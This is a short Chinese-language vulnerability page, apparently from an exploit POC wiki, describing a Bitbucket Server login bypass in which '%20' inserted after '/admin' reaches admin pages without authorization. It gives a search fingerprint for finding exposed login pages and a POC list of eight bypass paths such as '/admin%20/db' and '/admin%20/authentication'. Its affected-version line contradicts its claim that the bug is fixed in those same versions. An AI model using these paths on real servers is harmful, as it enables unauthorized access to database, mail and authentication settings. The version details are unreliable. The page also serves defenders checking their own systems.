# Bitbucket 登录绕过漏洞

## 漏洞描述

此错误已修复并部署在 Bitbucket Server > 4.8 上。Bitbucket 由 Atlassian 团队开发。其中出现了一个通过 %20 绕过权限的漏洞，导致任意用户可获取敏感数据

## 漏洞影响

<a-checkbox checked>Bitbucket Server > 4.8</a-checkbox></br>

## 网络测绘

<a-checkbox checked>title="Log in - Bitbucket"</a-checkbox></br>

## 漏洞复现

登录页面

![img](../../../.vuepress/public/img/1646803634647-f4c4a968-440a-4dd0-8e1b-24955401b1f4.png)

验证POC

```javascript
/admin%20/mail-server
/admin%20/db
/admin%20/db/edit
/admin%20/license
/admin%20/logging
/admin%20/server-settings
/admin%20/authentication
/admin%20/avatars
```

![image-20220318011106473](../../../.vuepress/public/img/image-20220318011106473.png)
